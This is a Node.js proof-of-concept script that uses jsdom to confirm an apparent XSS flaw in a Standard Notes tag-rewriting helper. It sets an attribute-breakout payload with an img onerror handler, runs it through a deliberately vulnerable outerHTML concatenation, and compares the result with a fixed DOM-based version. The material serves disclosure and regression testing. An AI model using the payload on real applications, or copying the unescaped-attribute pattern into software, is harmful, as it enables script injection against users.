const { JSDOM } = require("jsdom");
const fs = require("fs");
const FIXED = process.argv[2] === "fixed";

const dom = new JSDOM("<!DOCTYPE html><html><body></body></html>", {
  runScripts: "dangerously", resources: "usable",
  url: "https://app.standardnotes.com/",
});
const { document } = dom.window;
global.document = document;

function stripHTML_vuln(html) {
  const tmp = document.createElement("html");
  tmp.innerHTML = html;
  return tmp.textContent || tmp.innerText || "";
}
function changeElementTag_vuln(element, newTag) {
  const attributes = Array.prototype.slice.call(element.attributes);
  element.outerHTML = "<" + newTag + " " + attributes.map(function (attr) {
    return attr.name + '="' + attr.value + '"';
  }).join(" ") + ">" + element.innerHTML + "</" + newTag + ">";
}
function changeElementTag_fixed(element, newTag) {
  const doc = element.ownerDocument;
  const parent = element.parentElement;
  if (!parent) return;
  const replacement = doc.createElement(newTag);
  for (const attr of Array.from(element.attributes)) {
    replacement.setAttribute(attr.name, attr.value);
  }
  while (element.firstChild) {
    replacement.appendChild(element.firstChild);
  }
  parent.replaceChild(replacement, element);
}

const changeElementTag = FIXED ? changeElementTag_fixed : changeElementTag_vuln;
const marker = "window.__xss=1;console.log('LEAK:xss-executed-in-app-context')";
const payload = '"><img src=x onerror="' + marker + '"><x="';

const el = document.createElement("en-todo");
el.setAttribute("checked", "false");
el.setAttribute("title", payload);
el.innerHTML = "item";
document.body.appendChild(el);

changeElementTag(el, "div");

setTimeout(function () {
  const imgs = document.querySelectorAll("img");
  console.log("versao:", FIXED ? "3.201.25 (fix)" : "3.201.24 (vuln)");
  console.log("img injetadas no DOM:", imgs.length);
  let handler = "";
  if (imgs.length > 0) {
    handler = imgs[0].getAttribute("onerror") || "";
    console.log("handler onerror injetado:", handler ? handler.slice(0, 60) + "..." : "(nenhum)");
    try { imgs[0].dispatchEvent(new dom.window.Event("error")); } catch (e) {}
  }
  const fired = dom.window.__xss === 1;
  const injected = imgs.length > 0 && handler.indexOf("__xss") >= 0;
  console.log(fired ? "LEAK:xss-executed-in-app-context" : "execucao simulada (jsdom nao roda handler inline)");
  console.log(injected ? "RESULT:CONFIRMED" : "RESULT:NOT_CONFIRMED");
  process.exit(injected ? 0 : 1);
}, 2000);
